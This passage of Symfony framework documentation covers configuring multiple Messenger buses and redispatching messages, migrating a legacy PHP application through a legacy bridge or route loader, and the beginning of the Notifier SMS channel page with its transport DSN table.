            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:messenger>
                    <framework:transport name="my_transport" dsn="%env(MY_TRANSPORT_DSN)%" serializer="App\Messenger\Serializer\MessageWithTokenDecoder">
                        <!-- ... -->
                    </framework:transport>
                </framework:messenger>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/messenger.php
        use App\Messenger\Serializer\MessageWithTokenDecoder;
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $messenger = $framework->messenger();

            $messenger->transport('my_transport')
                ->dsn('%env(MY_TRANSPORT_DSN)%')
                ->serializer(MessageWithTokenDecoder::class);
        };

.. _messenger-multiple-buses:

Multiple Buses, Command & Event Buses
-------------------------------------

Messenger gives you a single message bus service by default. But, you can configure
as many as you want, creating "command", "query" or "event" buses and controlling
their middleware.

A common architecture when building applications is to separate commands from
queries. Commands are actions that do something and queries fetch data. This
is called CQRS (Command Query Responsibility Segregation). See Martin Fowler's
`article about CQRS`_ to learn more. This architecture could be used together
with the Messenger component by defining multiple buses.

A **command bus** is a little different from a **query bus**. For example, command
buses usually don't provide any results and query buses are rarely asynchronous.
You can configure these buses and their rules by using middleware.

It might also be a good idea to separate actions from reactions by introducing
an **event bus**. The event bus could have zero or more subscribers.

.. configuration-block::

    .. code-block:: yaml

        framework:
            messenger:
                # The bus that is going to be injected when injecting MessageBusInterface
                default_bus: command.bus
                buses:
                    command.bus:
                        middleware:
                            - validation
                            - doctrine_transaction
                    query.bus:
                        middleware:
                            - validation
                    event.bus:
                        default_middleware:
                            enabled: true
                            # set "allow_no_handlers" to true (default is false) to allow having
                            # no handler configured for this bus without throwing an exception
                            allow_no_handlers: false
                            # set "allow_no_senders" to false (default is true) to throw an exception
                            # if no sender is configured for this bus
                            allow_no_senders: true
                        middleware:
                            - validation

    .. code-block:: xml

        <!-- config/packages/messenger.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <!-- The bus that is going to be injected when injecting MessageBusInterface -->
                <framework:messenger default-bus="command.bus">
                    <framework:bus name="command.bus">
                        <framework:middleware id="validation"/>
                        <framework:middleware id="doctrine_transaction"/>
                    </framework:bus>
                    <framework:bus name="query.bus">
                        <framework:middleware id="validation"/>
                    </framework:bus>
                    <framework:bus name="event.bus">
                        <!-- set "allow-no-handlers" to true (default is false) to allow having
                              no handler configured for this bus without throwing an exception -->
                        <!-- set "allow-no-senders" to false (default is true) to throw an exception
                             if no sender is configured for this bus -->
                        <framework:default-middleware enabled="true" allow-no-handlers="false" allow-no-senders="true"/>
                        <framework:middleware id="validation"/>
                    </framework:bus>
                </framework:messenger>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/messenger.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            // The bus that is going to be injected when injecting MessageBusInterface
            $framework->messenger()->defaultBus('command.bus');

            $commandBus = $framework->messenger()->bus('command.bus');
            $commandBus->middleware()->id('validation');
            $commandBus->middleware()->id('doctrine_transaction');

            $queryBus = $framework->messenger()->bus('query.bus');
            $queryBus->middleware()->id('validation');

            $eventBus = $framework->messenger()->bus('event.bus');
            $eventBus->defaultMiddleware()
                ->enabled(true)
                // set "allowNoHandlers" to true (default is false) to allow having
                // no handler configured for this bus without throwing an exception
                ->allowNoHandlers(false)
                // set "allowNoSenders" to false (default is true) to throw an exception
                // if no sender is configured for this bus
                ->allowNoSenders(true)
            ;
            $eventBus->middleware()->id('validation');
        };

This will create three new services:

* ``command.bus``: autowireable with the :class:`Symfony\\Component\\Messenger\\MessageBusInterface`
  type-hint (because this is the ``default_bus``);

* ``query.bus``: autowireable with ``MessageBusInterface $queryBus``;

* ``event.bus``: autowireable with ``MessageBusInterface $eventBus``.

Restrict Handlers per Bus
~~~~~~~~~~~~~~~~~~~~~~~~~

By default, each handler will be available to handle messages on *all*
of your buses. To prevent dispatching a message to the wrong bus without an error,
you can restrict each handler to a specific bus using the ``messenger.message_handler`` tag:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            App\MessageHandler\SomeCommandHandler:
                tags: [{ name: messenger.message_handler, bus: command.bus }]

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\MessageHandler\SomeCommandHandler">
                    <tag name="messenger.message_handler" bus="command.bus"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        $container->services()
            ->set(App\MessageHandler\SomeCommandHandler::class)
            ->tag('messenger.message_handler', ['bus' => 'command.bus']);

This way, the ``App\MessageHandler\SomeCommandHandler`` handler will only be
known by the ``command.bus`` bus.

You can also automatically add this tag to a number of classes by using
the :ref:`_instanceof service configuration <di-instanceof>`. Using this,
you can determine the message bus based on an implemented interface:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...

            _instanceof:
                # all services implementing the CommandHandlerInterface
                # will be registered on the command.bus bus
                App\MessageHandler\CommandHandlerInterface:
                    tags:
                        - { name: messenger.message_handler, bus: command.bus }

                # while those implementing QueryHandlerInterface will be
                # registered on the query.bus bus
                App\MessageHandler\QueryHandlerInterface:
                    tags:
                        - { name: messenger.message_handler, bus: query.bus }

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <!-- ... -->

                <!-- all services implementing the CommandHandlerInterface
                     will be registered on the command.bus bus -->
                <instanceof id="App\MessageHandler\CommandHandlerInterface">
                    <tag name="messenger.message_handler" bus="command.bus"/>
                </instanceof>

                <!-- while those implementing QueryHandlerInterface will be
                     registered on the query.bus bus -->
                <instanceof id="App\MessageHandler\QueryHandlerInterface">
                    <tag name="messenger.message_handler" bus="query.bus"/>
                </instanceof>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\MessageHandler\CommandHandlerInterface;
        use App\MessageHandler\QueryHandlerInterface;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            // ...

            // all services implementing the CommandHandlerInterface
            // will be registered on the command.bus bus
            $services->instanceof(CommandHandlerInterface::class)
                ->tag('messenger.message_handler', ['bus' => 'command.bus']);

            // while those implementing QueryHandlerInterface will be
            // registered on the query.bus bus
            $services->instanceof(QueryHandlerInterface::class)
                ->tag('messenger.message_handler', ['bus' => 'query.bus']);
        };

Debugging the Buses
~~~~~~~~~~~~~~~~~~~

The ``debug:messenger`` command lists available messages & handlers per bus.
You can also restrict the list to a specific bus by providing its name as an argument.

.. code-block:: terminal

    $ php bin/console debug:messenger

      Messenger
      =========

      command.bus
      -----------

       The following messages can be dispatched:

       ---------------------------------------------------------------------------------------
        App\Message\DummyCommand
            handled by App\MessageHandler\DummyCommandHandler
        App\Message\MultipleBusesMessage
            handled by App\MessageHandler\MultipleBusesMessageHandler
       ---------------------------------------------------------------------------------------

      query.bus
      ---------

       The following messages can be dispatched:

       ---------------------------------------------------------------------------------------
        App\Message\DummyQuery
            handled by App\MessageHandler\DummyQueryHandler
        App\Message\MultipleBusesMessage
            handled by App\MessageHandler\MultipleBusesMessageHandler
       ---------------------------------------------------------------------------------------

.. tip::

    The command will also show the PHPDoc description of the message and handler classes.

Redispatching a Message
-----------------------

It you want to redispatch a message (using the same transport and envelope), create
a new :class:`Symfony\\Component\\Messenger\\Message\\RedispatchMessage` and dispatch
it through your bus. Reusing the same ``SmsNotification`` example shown earlier::

    // src/MessageHandler/SmsNotificationHandler.php
    namespace App\MessageHandler;

    use App\Message\SmsNotification;
    use Symfony\Component\Messenger\Attribute\AsMessageHandler;
    use Symfony\Component\Messenger\Message\RedispatchMessage;
    use Symfony\Component\Messenger\MessageBusInterface;

    #[AsMessageHandler]
    class SmsNotificationHandler
    {
        public function __construct(private MessageBusInterface $bus)
        {
        }

        public function __invoke(SmsNotification $message): void
        {
            // do something with the message
            // then redispatch it based on your own logic

            if ($needsRedispatch) {
                $this->bus->dispatch(new RedispatchMessage($message));
            }
        }
    }

The built-in :class:`Symfony\\Component\\Messenger\\Handler\\RedispatchMessageHandler`
will take care of this message to redispatch it through the same bus it was
dispatched at first. You can also use the second argument of the ``RedispatchMessage``
constructor to provide transports to use when redispatching the message.

Learn more
----------

.. toctree::
    :maxdepth: 1
    :glob:

    /messenger/*

.. _`Enqueue's transport`: https://github.com/sroze/messenger-enqueue-transport
.. _`streams`: https://redis.io/topics/streams-intro
.. _`Supervisor docs`: http://supervisord.org/
.. _`PCNTL`: https://www.php.net/manual/book.pcntl.php
.. _`systemd docs`: https://www.freedesktop.org/wiki/Software/systemd/
.. _`SymfonyCasts' message serializer tutorial`: https://symfonycasts.com/screencast/messenger/transport-serializer
.. _`Long polling`: https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-short-and-long-polling.html
.. _`Visibility Timeout`: https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-visibility-timeout.html
.. _`FIFO queue`: https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/FIFO-queues.html
.. _`LISTEN/NOTIFY`: https://www.postgresql.org/docs/current/sql-notify.html
.. _`AMQProxy`: https://github.com/cloudamqp/amqproxy
.. _`high connection churn`: https://www.rabbitmq.com/connections.html#high-connection-churn
.. _`article about CQRS`: https://martinfowler.com/bliki/CQRS.html
Migrating an Existing Application to Symfony
============================================

When you have an existing application that was not built with Symfony,
you might want to move over parts of that application without rewriting
the existing logic completely. For those cases there is a pattern called
`Strangler Fig Application`_. The basic idea of this pattern is to create a
new application that gradually takes over functionality from an existing
application. This migration approach can be implemented with Symfony in
various ways and has some benefits over a rewrite such as being able
to introduce new features in the existing application and reducing risk
by avoiding a "big bang"-release for the new application.

.. admonition:: Screencast
    :class: screencast

    The topic of migrating from an existing application towards Symfony is
    sometimes discussed during conferences. For example the talk
    `Modernizing with Symfony`_ reiterates some of the points from this page.

Prerequisites
-------------

Before you start introducing Symfony to the existing application, you have to
ensure certain requirements are met by your existing application and
environment.  Making the decisions and preparing the environment before
starting the migration process is crucial for its success.

.. note::

    The following steps do not require you to have the new Symfony
    application in place and in fact it might be safer to introduce these
    changes beforehand in your existing application.

Choosing the Target Symfony Version
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Most importantly, this means that you will have to decide which version you
are aiming to migrate to, either a current stable release or the long
term support version (LTS). The main difference is, how frequently you
will need to upgrade in order to use a supported version. In the context
of a migration, other factors, such as the supported PHP-version or
support for libraries/bundles you use, may have a strong impact as well.
Using the most recent, stable release will likely give you more features,
but it will also require you to update more frequently to ensure you will
get support for bug fixes and security patches and you will have to work
faster on fixing deprecations to be able to upgrade.

.. tip::

    When upgrading to Symfony you might be tempted to also use
    :ref:`Flex <symfony-flex>`. Please keep in mind that it primarily
    focuses on bootstrapping a new Symfony application according to best
    practices regarding the directory structure. When you work in the
    constraints of an existing application you might not be able to
    follow these constraints, making Flex less useful.

First of all your environment needs to be able to support the minimum
requirements for both applications. In other words, when the Symfony
release you aim to use requires PHP 7.1 and your existing application
does not yet support this PHP version, you will probably have to upgrade
your legacy project. Use the ``check:requirements`` command to check if your
server meets the :ref:`technical requirements for running Symfony applications <symfony-tech-requirements>`
and compare them with your current application's environment to make sure you
are able to run both applications on the same system. Having a test
system, that is as close to the production environment as possible,
where you can just install a new Symfony project next to the existing one
and check if it is working will give you an even more reliable result.

.. tip::

    If your current project is running on an older PHP version such as
    PHP 5.x upgrading to a recent version will give you a performance
    boost without having to change your code.

Setting up Composer
~~~~~~~~~~~~~~~~~~~

Another point you will have to look out for is conflicts between
dependencies in both applications. This is especially important if your
existing application already uses Symfony components or libraries commonly
used in Symfony applications such as Doctrine ORM or Twig.
A good way for ensuring compatibility is to use the same ``composer.json``
for both project's dependencies.

Once you have introduced composer for managing your project's dependencies
you can use its autoloader to ensure you do not run into any conflicts due
to custom autoloading from your existing framework. This usually entails
adding an `autoload`_-section to your ``composer.json`` and configuring it
based on your application and replacing your custom logic with something
like this::

    require __DIR__.'/vendor/autoload.php';

Removing Global State from the Legacy Application
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

In older PHP applications it was quite common to rely on global state and
even mutate it during runtime. This might have side effects on the newly
introduced Symfony application. In other words code relying on globals
in the existing application should be refactored to allow for both systems
to work simultaneously. Since relying on global state is considered an
anti-pattern nowadays you might want to start working on this even before
doing any integration.

Setting up the Environment
~~~~~~~~~~~~~~~~~~~~~~~~~~

There might be additional steps you need to take depending on the libraries
you use, the original framework your project is based on and most importantly
the age of the project as PHP itself underwent many improvements throughout
the years that your code might not have caught on to, yet. As long as both
your existing code and a new Symfony project can run in parallel on the
same system you are on a good way. All these steps do not require you to
introduce Symfony just yet and will already open up some opportunities for
modernizing your existing code.

Establishing a Safety Net for Regressions
-----------------------------------------

Before you can safely make changes to the existing code, you must ensure that
nothing will break. One reason for choosing to migrate is making sure that the
application is in a state where it can run at all times. The best way for
ensuring a working state is to establish automated tests.

It is quite common for an existing application to either not have a test suite
at all or have low code coverage. Introducing unit tests for this code is
likely not cost effective as the old code might be replaced with functionality
from Symfony components or might be adapted to the new application.
Additionally legacy code tends to be hard to write tests for, making the process
slow and cumbersome.

Instead of providing low level tests, that ensure each class works as expected, it
might makes sense to write high level tests ensuring that at least anything user
facing works on at least a superficial level. These kinds of tests are commonly
called End-to-End tests, because they cover the whole application from what the
user sees in the browser down to the very code that is being run and connected
services like a database. To automate this you have to make sure that you can
get a test instance of your system running as easily as possible and making
sure that external systems do not change your production environment, e.g.
provide a separate test database with (anonymized) data from a production
system or being able to setup a new schema with a basic dataset for your test
environment. Since these tests do not rely as much on isolating testable code
and instead look at the interconnected system, writing them is usually easier
and more productive when doing a migration. You can then limit your effort on
writing lower level tests on parts of the code that you have to change or
replace in the new application making sure it is testable right from the start.

There are tools aimed at End-to-End testing you can use such as
`Symfony Panther`_ or you can write :doc:`functional tests </testing>`
in the new Symfony application as soon as the initial setup is completed.
For example you can add so called Smoke Tests, which only ensure a certain
path is accessible by checking the HTTP status code returned or looking for
a text snippet from the page.

Introducing Symfony to the Existing Application
-----------------------------------------------

The following instructions only provide an outline of common tasks for
setting up a Symfony application that falls back to a legacy application
whenever a route is not accessible. Your mileage may vary and likely you
will need to adjust some of this or even provide additional configuration
or retrofitting to make it work with your application. This guide is not
supposed to be comprehensive and instead aims to be a starting point.

.. tip::

    If you get stuck or need additional help you can reach out to the
    :doc:`Symfony community </contributing/community/index>` whenever you need
    concrete feedback on an issue you are facing.

Booting Symfony in a Front Controller
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

When looking at how a typical PHP application is bootstrapped there are
two major approaches. Nowadays most frameworks provide a so called
front controller which acts as an entrypoint. No matter which URL-path
in your application you are going to, every request is being sent to
this front controller, which then determines which parts of your
application to load, e.g. which controller and action to call. This is
also the approach that Symfony takes with ``public/index.php`` being
the front controller. Especially in older applications it was common
that different paths were handled by different PHP files.

In any case you have to create a ``public/index.php`` that will start
your Symfony application by either copying the file from the
``FrameworkBundle``-recipe or by using Flex and requiring the
FrameworkBundle. You will also likely have to update your web server
(e.g. Apache or nginx) to always use this front controller. You can
look at :doc:`Web Server Configuration </setup/web_server_configuration>`
for examples on how this might look. For example when using Apache you can
use Rewrite Rules to ensure PHP files are ignored and instead only index.php
is called:

.. code-block:: apache

    RewriteEngine On

    RewriteCond %{REQUEST_URI}::$1 ^(/.+)/(.*)::\2$
    RewriteRule ^(.*) - [E=BASE:%1]

    RewriteCond %{ENV:REDIRECT_STATUS} ^$
    RewriteRule ^index\.php(?:/(.*)|$) %{ENV:BASE}/$1 [R=301,L]

    RewriteRule ^index\.php - [L]

    RewriteCond %{REQUEST_FILENAME} -f
    RewriteCond %{REQUEST_FILENAME} !^.+\.php$
    RewriteRule ^ - [L]

    RewriteRule ^ %{ENV:BASE}/index.php [L]

This change will make sure that from now on your Symfony application is
the first one handling all requests. The next step is to make sure that
your existing application is started and taking over whenever Symfony
can not yet handle a path previously managed by the existing application.

From this point, many tactics are possible and every project requires its
unique approach for migration. This guide shows two examples of commonly used
approaches, which you can use as a base for your own approach:

* `Front Controller with Legacy Bridge`_, which leaves the legacy application
  untouched and allows migrating it in phases to the Symfony application.
* `Legacy Route Loader`_, where the legacy application is integrated in phases
  into Symfony, with a fully integrated final result.

Front Controller with Legacy Bridge
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Once you have a running Symfony application that takes over all requests,
falling back to your legacy application is done by extending the original front
controller script with some logic for going to your legacy system. The file
could look something like this::

    // public/index.php
    use App\Kernel;
    use App\LegacyBridge;
    use Symfony\Component\Dotenv\Dotenv;
    use Symfony\Component\ErrorHandler\Debug;
    use Symfony\Component\HttpFoundation\Request;

    require dirname(__DIR__).'/vendor/autoload.php';

    (new Dotenv())->bootEnv(dirname(__DIR__).'/.env');

    /*
     * The kernel will always be available globally, allowing you to
     * access it from your existing application and through it the
     * service container. This allows for introducing new features in
     * the existing application.
     */
    global $kernel;

    if ($_SERVER['APP_DEBUG']) {
        umask(0000);

        Debug::enable();
    }

    if ($trustedProxies = $_SERVER['TRUSTED_PROXIES'] ?? $_ENV['TRUSTED_PROXIES'] ?? false) {
        Request::setTrustedProxies(
          explode(',', $trustedProxies),
          Request::HEADER_X_FORWARDED_FOR | Request::HEADER_X_FORWARDED_PORT | Request::HEADER_X_FORWARDED_PROTO
        );
    }

    if ($trustedHosts = $_SERVER['TRUSTED_HOSTS'] ?? $_ENV['TRUSTED_HOSTS'] ?? false) {
        Request::setTrustedHosts([$trustedHosts]);
    }

    $kernel = new Kernel($_SERVER['APP_ENV'], (bool) $_SERVER['APP_DEBUG']);
    $request = Request::createFromGlobals();
    $response = $kernel->handle($request);

    if (false === $response->isNotFound()) {
        // Symfony successfully handled the route.
        $response->send();
    } else {
        LegacyBridge::handleRequest($request, $response, __DIR__);
    }

    $kernel->terminate($request, $response);

There are 2 major deviations from the original file:

Line 18
  First of all, ``$kernel`` is made globally available. This allows you to use
  Symfony features inside your existing application and gives access to
  services configured in our Symfony application. This helps you prepare your
  own code to work better within the Symfony application before you transition
  it over. For instance, by replacing outdated or redundant libraries with
  Symfony components.

Line 41 - 46
  If Symfony handled the response, it is sent; otherwise, the ``LegacyBridge``
  handles the request.

This legacy bridge is responsible for figuring out which file should be loaded
in order to process the old application logic. This can either be a front
controller similar to Symfony's ``public/index.php`` or a specific script file
based on the current route. The basic outline of this LegacyBridge could look
somewhat like this::

    // src/LegacyBridge.php
    namespace App;

    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;

    class LegacyBridge
    {

        /**
         * Map the incoming request to the right file. This is the
         * key function of the LegacyBridge.
         *
         * Sample code only. Your implementation will vary, depending on the
         * architecture of the legacy code and how it's executed.
         *
         * If your mapping is complicated, you may want to write unit tests
         * to verify your logic, hence this is public static.
         */
        public static function getLegacyScript(Request $request): string
        {
            $requestPathInfo = $request->getPathInfo();
            $legacyRoot = __DIR__ . '/../';

            // Map a route to a legacy script:
            if ($requestPathInfo == '/customer/') {
                return "{$legacyRoot}src/customers/list.php";
            }

            // Map a direct file call, e.g. an ajax call:
            if ($requestPathInfo == 'inc/ajax_cust_details.php') {
                return "{$legacyRoot}inc/ajax_cust_details.php";
            }

            // ... etc.

            throw new \Exception("Unhandled legacy mapping for $requestPathInfo");
        }

        public static function handleRequest(Request $request, Response $response, string $publicDirectory): void
        {
            $legacyScriptFilename = LegacyBridge::getLegacyScript($request);

            // Possibly (re-)set some env vars (e.g. to handle forms
            // posting to PHP_SELF):
            $p = $request->getPathInfo();
            $_SERVER['PHP_SELF'] = $p;
            $_SERVER['SCRIPT_NAME'] = $p;
            $_SERVER['SCRIPT_FILENAME'] = $legacyScriptFilename;

            require $legacyScriptFilename;
        }
    }

This is the most generic approach you can take, that is likely to work
no matter what your previous system was. You might have to account for
certain "quirks", but since your original application is only started
after Symfony finished handling the request you reduced the chances
for side effects and any interference.

Since the old script is called in the global variable scope it will reduce side
effects on the old code which can sometimes require variables from the global
scope. At the same time, because your Symfony application will always be
booted first, you can access the container via the ``$kernel`` variable and
then fetch any service (using :method:`Symfony\\Component\\HttpKernel\\KernelInterface::getContainer`).
This can be helpful if you want to introduce new features to your legacy
application, without switching over the whole action to the new application.
For example, you could now use the Symfony Translator in your old application
or instead of using your old database logic, you could use Doctrine to refactor
old queries. This will also allow you to incrementally improve the legacy code
making it easier to transition it over to the new Symfony application.

The major downside is, that both systems are not well integrated
into each other leading to some redundancies and possibly duplicated code.
For example, since the Symfony application is already done handling the
request you can not take advantage of kernel events or utilize Symfony's
routing for determining which legacy script to call.

Legacy Route Loader
~~~~~~~~~~~~~~~~~~~

The major difference to the LegacyBridge-approach from before is, that the
logic is moved inside the Symfony application. It removes some of the
redundancies and allows us to also interact with parts of the legacy
application from inside Symfony, instead of just the other way around.

.. tip::

    The following route loader is just a generic example that you might
    have to tweak for your legacy application. You can familiarize
    yourself with the concepts by reading up on it in :doc:`Routing </routing>`.

The legacy route loader is :doc:`a custom route loader </routing/custom_route_loader>`.
The legacy route loader has a similar functionality as the previous
LegacyBridge, but it is a service that is registered inside Symfony's Routing
component::

    // src/Legacy/LegacyRouteLoader.php
    namespace App\Legacy;

    use Symfony\Component\Config\Loader\Loader;
    use Symfony\Component\Routing\Route;
    use Symfony\Component\Routing\RouteCollection;

    class LegacyRouteLoader extends Loader
    {
        // ...

        public function load($resource, $type = null): RouteCollection
        {
            $collection = new RouteCollection();
            $finder = new Finder();
            $finder->files()->name('*.php');

            /** @var SplFileInfo $legacyScriptFile */
            foreach ($finder->in($this->webDir) as $legacyScriptFile) {
                // This assumes all legacy files use ".php" as extension
                $filename = basename($legacyScriptFile->getRelativePathname(), '.php');
                $routeName = sprintf('app.legacy.%s', str_replace('/', '__', $filename));

                $collection->add($routeName, new Route($legacyScriptFile->getRelativePathname(), [
                    '_controller' => 'App\Controller\LegacyController::loadLegacyScript',
                    'requestPath' => '/' . $legacyScriptFile->getRelativePathname(),
                    'legacyScript' => $legacyScriptFile->getPathname(),
                ]));
            }

            return $collection;
        }
    }

You will also have to register the loader in your application's
``routing.yaml`` as described in the documentation for
:doc:`Custom Route Loaders </routing/custom_route_loader>`.
Depending on your configuration, you might also have to tag the service with
``routing.loader``. Afterwards you should be able to see all the legacy routes
in your route configuration, e.g. when you call the ``debug:router``-command:

.. code-block:: terminal

    $ php bin/console debug:router

In order to use these routes you will need to create a controller that handles
these routes. You might have noticed the ``_controller`` attribute in the
previous code example, which tells Symfony which Controller to call whenever it
tries to access one of our legacy routes. The controller itself can then use the
other route attributes (i.e. ``requestPath`` and ``legacyScript``) to determine
which script to call and wrap the output in a response class::

    // src/Controller/LegacyController.php
    namespace App\Controller;

    use Symfony\Component\HttpFoundation\StreamedResponse;

    class LegacyController
    {
        public function loadLegacyScript(string $requestPath, string $legacyScript): StreamedResponse
        {
            return new StreamedResponse(
                function () use ($requestPath, $legacyScript): void {
                    $_SERVER['PHP_SELF'] = $requestPath;
                    $_SERVER['SCRIPT_NAME'] = $requestPath;
                    $_SERVER['SCRIPT_FILENAME'] = $legacyScript;

                    chdir(dirname($legacyScript));

                    require $legacyScript;
                }
            );
        }
    }

This controller will set some server variables that might be needed by
the legacy application. This will simulate the legacy script being called
directly, in case it relies on these variables (e.g. when determining
relative paths or file names). Finally the action requires the old script,
which essentially calls the original script as before, but it runs inside
our current application scope, instead of the global scope.

There are some risks to this approach, as it is no longer run in the global
scope. However, since the legacy code now runs inside a controller action, you gain
access to many functionalities from the new Symfony application, including the
chance to use Symfony's event lifecycle. For instance, this allows you to
transition the authentication and authorization of the legacy application over
to the Symfony application using the Security component and its firewalls.

.. _`Strangler Fig Application`: https://martinfowler.com/bliki/StranglerFigApplication.html
.. _`autoload`: https://getcomposer.org/doc/04-schema.md#autoload
.. _`Modernizing with Symfony`: https://youtu.be/YzyiZNY9htQ
.. _`Symfony Panther`: https://github.com/symfony/panther
Creating and Sending Notifications
==================================

Installation
------------

Current web applications use many different channels to send messages to
the users (e.g. SMS, Slack messages, emails, push notifications, etc.). The
Notifier component in Symfony is an abstraction on top of all these
channels. It provides a dynamic way to manage how the messages are sent.
Get the Notifier installed using:

.. code-block:: terminal

    $ composer require symfony/notifier

.. _channels-chatters-texters-email-and-browser:

Channels: Chatters, Texters, Email, Browser and Push
----------------------------------------------------

The notifier component can send notifications to different channels. Each
channel can integrate with different providers (e.g. Slack or Twilio SMS)
by using transports.

The notifier component supports the following channels:

* :ref:`SMS channel <notifier-sms-channel>` sends notifications to phones via
  SMS messages;
* :ref:`Chat channel <notifier-chat-channel>` sends notifications to chat
  services like Slack and Telegram;
* :ref:`Email channel <notifier-email-channel>` integrates the :doc:`Symfony Mailer </mailer>`;
* Browser channel uses :ref:`flash messages <flash-messages>`.
* :ref:`Push channel <notifier-push-channel>` sends notifications to phones and browsers via push notifications.

.. tip::

    Use :doc:`secrets </configuration/secrets>` to securely store your
    API tokens.

.. _notifier-sms-channel:

SMS Channel
~~~~~~~~~~~

.. caution::

    If any of the DSN values contains any character considered special in a
    URI (such as ``: / ? # [ ] @ ! $ & ' ( ) * + , ; =``), you must
    encode them. See `RFC 3986`_ for the full list of reserved characters or use the
    :phpfunction:`urlencode` function to encode them.

The SMS channel uses :class:`Symfony\\Component\\Notifier\\Texter` classes
to send SMS messages to mobile phones. This feature requires subscribing to
a third-party service that sends SMS messages. Symfony provides integration
with a couple popular SMS services:

==================  =====================================  ========================================================================================================================= ===============
Service             Package                                DSN                                                                                                                       Webhook support
==================  =====================================  ========================================================================================================================= ===============
`46elks`_           ``symfony/forty-six-elks-notifier``    ``forty-six-elks://API_USERNAME:API_PASSWORD@default?from=FROM``
`AllMySms`_         ``symfony/all-my-sms-notifier``        ``allmysms://LOGIN:APIKEY@default?from=FROM``
`AmazonSns`_        ``symfony/amazon-sns-notifier``        ``sns://ACCESS_KEY:SECRET_KEY@default?region=REGION``
`Bandwidth`_        ``symfony/bandwidth-notifier``         ``bandwidth://USERNAME:PASSWORD@default?from=FROM&account_id=ACCOUNT_ID&application_id=APPLICATION_ID&priority=PRIORITY``
`Brevo`_            ``symfony/brevo-notifier``             ``brevo://API_KEY@default?sender=SENDER``
`Clickatell`_       ``symfony/clickatell-notifier``        ``clickatell://ACCESS_TOKEN@default?from=FROM``
`ContactEveryone`_  ``symfony/contact-everyone-notifier``  ``contact-everyone://TOKEN@default?&diffusionname=DIFFUSION_NAME&category=CATEGORY``
`Esendex`_          ``symfony/esendex-notifier``           ``esendex://USER_NAME:PASSWORD@default?accountreference=ACCOUNT_REFERENCE&from=FROM``
`FakeSms`_          ``symfony/fake-sms-notifier``          ``fakesms+email://MAILER_SERVICE_ID?to=TO&from=FROM`` or ``fakesms+logger://default``
`FreeMobile`_       ``symfony/free-mobile-notifier``       ``freemobile://LOGIN:API_KEY@default?phone=PHONE``
`GatewayApi`_       ``symfony/gateway-api-notifier``       ``gatewayapi://TOKEN@default?from=FROM``
`GoIP`_             ``symfony/goip-notifier``              ``goip://USERNAME:PASSWORD@HOST:80?sim_slot=SIM_SLOT``
`Infobip`_          ``symfony/infobip-notifier``           ``infobip://AUTH_TOKEN@HOST?from=FROM``
`Iqsms`_            ``symfony/iqsms-notifier``             ``iqsms://LOGIN:PASSWORD@default?from=FROM``
`KazInfoTeh`_       ``symfony/kaz-info-teh-notifier``      ``kaz-info-teh://USERNAME:PASSWORD@default?sender=FROM``
`LightSms`_         ``symfony/light-sms-notifier``         ``lightsms://LOGIN:TOKEN@default?from=PHONE``
`LOX24`_            ``symfony/lox24-notifier``             ``lox24://USER:TOKEN@default?from=FROM``
`Mailjet`_          ``symfony/mailjet-notifier``           ``mailjet://TOKEN@default?from=FROM``
`MessageBird`_      ``symfony/message-bird-notifier``      ``messagebird://TOKEN@default?from=FROM``
`MessageMedia`_     ``symfony/message-media-notifier``     ``messagemedia://API_KEY:API_SECRET@default?from=FROM``
`Mobyt`_            ``symfony/mobyt-notifier``             ``mobyt://USER_KEY:ACCESS_TOKEN@default?from=FROM``
`Nexmo`_            ``symfony/nexmo-notifier``             Abandoned in favor of Vonage (symfony/vonage-notifier).
`Octopush`_         ``symfony/octopush-notifier``          ``octopush://USERLOGIN:APIKEY@default?from=FROM&type=TYPE``
`OrangeSms`_        ``symfony/orange-sms-notifier``        ``orange-sms://CLIENT_ID:CLIENT_SECRET@default?from=FROM&sender_name=SENDER_NAME``
